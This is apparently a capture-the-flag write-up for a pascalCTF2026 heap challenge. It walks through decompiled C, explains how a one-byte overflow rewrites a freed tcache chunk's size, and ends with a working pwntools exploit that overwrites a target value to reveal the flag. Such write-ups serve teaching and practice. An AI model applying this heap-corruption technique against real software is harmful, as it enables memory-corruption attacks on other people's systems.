## Overview
- This challenge exploits the heap overflow and UAF (use after free) vulnerability to overwrite chunk size, expanding the chunk size.

---
## Analysis
- Provide file elf 64-bit

![alt text](/images/pascalCTF2026/ahc_file.png)
![alt text](/images/pascalCTF2026/ahc_checksec.png)

- In `main` func:
```c
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)
{
  int opt; // [rsp+4h] [rbp-Ch]

  setup_chall(argc, argv, envp);
  while ( 1 )
  {
    while ( 1 )
    {
      print_menu();
      opt = read_int(1, 5);                     // 1 <= opt < 5
      if ( opt != 5 )
        break;
      check_target();
    }
    if ( opt > 5 )
    {
LABEL_14:
      puts("Invalid choice!");
    }
    else
    {
      switch ( opt )
      {
        case 4:
          puts("Exiting...");
          exit(0);
        case 3:
          print_players();
          break;
        case 1:
          create_player();
          break;
        case 2:
          delete_player();
          break;
        default:
          goto LABEL_14;
      }
    }
  }
}
```

- `setup_chall` func, 
reset and initialize the value; at this point, the **bins** contains 72-sized chunks that have been mallocated and free. The *target* is declared at the very end of the heap.
```c
  for ( i = 0; i <= 4; ++i )
    (&players)[i] = malloc(72u);
  for ( j = 4; j >= 0; --j )
  {
    free((&players)[j]);
    (&players)[j] = 0;
  }
  target = malloc(8u);
  *target = 0xBABEBABEBABEBABELL;
```

- In `check_target` func, cmp *target* and print flag, need modify *target* value.
```c
  if ( *target == 0xDEADBEEFCAFEBABELL )
  {
    puts("I see you know your way around this stuff, here's a flag!");
    if ( getenv("FLAG") )
    {
      flag = getenv("FLAG");
      puts(flag);
    }
```

- `create_player` func, allows the user to enter the length and enter the name and message. If len = 0, malloc(72) will take the chunk from **bins** for reuse because it is the same size.
```c
    printf("The default name length is 32 characters, how many more do you need? ");
    len = read_int(0, 32);
    str = malloc((int)len + 72LL);
    len_name = read_name(str, len);
    if ( len_name <= (int)(len + 31) )
    len_name = len + 32;
    read_message((char *)str + len_name);
    (&players)[idx] = str;
    extra_lengths[idx] = len_name - 32;
    ++player_count;
    printf("Created player at index %d\n", idx);

```

- `read_name` allows a maximum of `len + 39` characters, `read_message` allows a maximum of 39 characters, plus a '\0' added after scanf, the maximum would be `len + 80` characters. Since the chunk size is 72, only 8 characters can be overwritten if len = 0, and the *target* value cannot be reached if the overwrite is done at the last index.
- The approach would be to use index 3 to overwrite the chunk size of index 4 (which is currently in tcachebins), reuse index 4, and free it again. This time, the chunk size of index 4 in the bins has been changed, and it's entirely possible to reuse index 4 with a larger size and write to *target* var.

![alt text](/images/pascalCTF2026/ahc_heap.png)

---
## Exploit code
```python
#!/usr/bin/env python3

from pwn import *

elf = ELF('average', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = elf

if args.REMOTE:
    r = remote('')
else:
    r = process('./average')

# Overwrite chunk size of index 4
for i in range(5):
    r.sendlineafter(b'> ', b'1')
    r.sendlineafter(b': ', str(i).encode())
    r.sendlineafter(b'? ', b'0')
    
    r.sendlineafter(b'name: ', b'a' if i != 3 else b'a'*39)
    r.sendlineafter(b'message: ', b'a' if i != 3 else b'b'*32 + b'\x71')

# Free chunk index 4
r.sendlineafter(b'> ', b'2')
r.sendlineafter(b': ', b'4')

# Alloc index 4 to overwrite target
r.sendlineafter(b'> ', b'1')
r.sendlineafter(b': ', b'4')
r.sendlineafter(b'? ', b'24')
    
r.sendlineafter(b'name: ', b'a'*63)
r.sendlineafter(b'message: ', b'b'* 16 + p64(0xDEADBEEFCAFEBABE))

# Call check_target
r.sendlineafter(b'> ', b'5')

r.interactive()
```